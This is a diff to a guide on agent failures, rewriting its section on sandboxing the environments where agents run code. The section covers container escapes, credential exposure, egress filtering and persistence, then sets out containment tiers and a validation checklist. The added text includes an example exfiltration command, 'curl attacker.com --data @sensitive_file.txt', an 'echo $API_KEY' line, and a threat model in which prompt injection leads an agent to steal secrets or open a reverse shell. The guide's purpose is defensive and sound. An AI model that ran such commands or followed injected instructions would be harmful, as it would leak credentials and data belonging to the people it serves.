@@ -61,23 +61,43 @@ Use this taxonomy to classify incidents quickly and choose the right fix path.
 
 #### Execution Environment Containment
 
-Agent-generated code that executes without proper isolation creates severe security risks. When agents can write and run arbitrary code, insufficient sandboxing leads to credential theft, filesystem damage, lateral movement to other systems, and data exfiltration. These failures often go undetected until an incident occurs.
+Agent execution environments determine blast radius when things go wrong. Insufficient isolation allows a compromised or buggy agent to damage the host system, access sensitive data, or pivot to other systems. The containment strategy must match the risk profile of the code being executed.
 
-**Examples of security failures with insufficient isolation:**
+**Shared-kernel risks.** Containerized agents (Docker, Podman) share the host kernel with other workloads. A kernel vulnerability or container escape gives the attacker access to everything on that host. This is acceptable for trusted code but insufficient for executing LLM-generated code or user-provided scripts where you cannot guarantee safety. Kernel exploits, though rare, have blast radius equal to the entire host.
 
-*Shared kernel vulnerabilities* occur when container-based isolation allows kernel exploits to compromise the host system. An agent exploiting a container escape vulnerability gains full host access, potentially compromising all workloads on the machine and accessing secrets from other tenants.
+**Credential exposure paths.** If secrets exist in the execution environment—as environment variables, mounted files, or in-memory—compromised agent code can exfiltrate them. A prompt injection attack that causes the agent to execute malicious code can then steal API keys, database credentials, or cloud access tokens. Examples include agents that `echo $API_KEY` to debug output that gets logged, or code that opens a reverse shell and exfiltrates environment state.
 
-*Credential exposure in process memory* happens when secrets are passed as environment variables or command-line arguments. Any code running in the same environment—including malicious agent-generated code—can read these credentials from `/proc` or memory dumps. Once stolen, credentials can be exfiltrated and used for unauthorized access.
+**Network exfiltration.** Without egress filtering, a compromised agent can send arbitrary data to attacker-controlled servers. This includes source code, user data, credentials, or internal system information. Even if credentials are protected, unrestricted networking allows data theft and command-and-control communication. A malicious agent might `curl attacker.com --data @sensitive_file.txt` or establish a persistent backdoor.
 
-*Unrestricted network access* enables data exfiltration and command-and-control communication. An agent without network allowlisting can connect to arbitrary servers, uploading sensitive data or receiving instructions from attackers. Without egress filtering, detecting this activity requires analysis of network flows after the fact.
+**Persistence and lateral movement.** If agent filesystems persist between runs or share state with other systems, malicious code can establish persistence or move laterally. An agent that writes to `/home/user/.bashrc` or modifies system cron jobs can survive restarts. One that accesses shared network filesystems can spread to other systems. Ephemeral, disposable execution environments prevent this by resetting to a clean state after every run.
 
-**Risk assessment guidance** helps determine when sandboxing is necessary versus overkill:
+**Examples of insufficient isolation:**
 
-*Sandboxing is essential* when agents execute code from untrusted sources (user-provided scripts, LLM-generated code, third-party plugins), when agents access production systems or sensitive data (customer databases, internal APIs, financial systems), when compliance requires audit trails and containment (HIPAA, SOC 2, PCI-DSS), or when blast radius must be limited (multi-tenant platforms, shared infrastructure).
+1. **Developer laptop execution:** Running untrusted agent code directly on a development machine with access to SSH keys, cloud credentials, and source repositories. A single prompt injection could compromise the entire development environment.
 
-*Lighter isolation may suffice* when agents run only in development environments with no access to production, when all code is human-reviewed before execution, when the agent operates in read-only mode without write capabilities, or when the entire system runs in an already-isolated environment (dedicated VM, air-gapped network).
+2. **Long-lived containers with secrets:** Agents that run in containers with environment variable secrets and no egress filtering. If the agent is compromised via prompt injection, attackers can exfiltrate credentials and pivot to cloud resources.
 
-The cost of implementing proper sandboxing is almost always lower than the cost of recovering from a security incident. Start with stronger isolation and relax it only after demonstrating that threats are mitigated through other controls. For sandboxing strategies and implementation patterns, see [Agentic Scaffolding](030-scaffolding.md#secure-execution-environments).
+3. **Shared CI runners without sandboxing:** Using shared GitHub Actions runners or similar CI infrastructure to execute agent-generated code without additional isolation. A malicious PR could inject code that steals repository secrets or modifies other jobs.
+
+**Appropriate containment strategies:**
+
+For **low-risk scenarios** (trusted code, internal tools, read-only operations), process-level isolation or containers with basic security policies (seccomp, AppArmor) are sufficient. The convenience and ecosystem maturity outweigh isolation concerns.
+
+For **medium-risk scenarios** (LLM-generated code, unknown code quality, limited external input), use containers with strict egress filtering, sealed secrets (never environment variables), and ephemeral filesystems. Add network policies that allowlist only required API endpoints.
+
+For **high-risk scenarios** (user-provided code, untrusted input, access to sensitive data), use microVMs or full VMs with network-layer secret injection, default-deny networking, and fully disposable filesystems. No credentials should ever exist inside the execution environment. Consider transparent proxies that inject credentials at the network boundary, as discussed in [Agentic Scaffolding](030-scaffolding.md#secure-execution-environments).
+
+**Validation before deployment:**
+
+Before running agent code in production, verify that:
+- Protected paths (credentials, system files, configuration) are read-only or inaccessible
+- Egress filtering blocks all destinations except explicitly allowed API endpoints
+- Secrets are not present in the environment or filesystem
+- Filesystem changes do not persist between runs
+- Resource limits (CPU, memory, disk) prevent denial-of-service
+- Execution timeouts prevent runaway processes
+
+Test these controls by intentionally trying to violate them. An agent that cannot bypass its own sandboxing is ready for production. One that can needs stronger isolation before it handles real workloads.
 
 ### 5) Collaboration and Workflow Failures
 
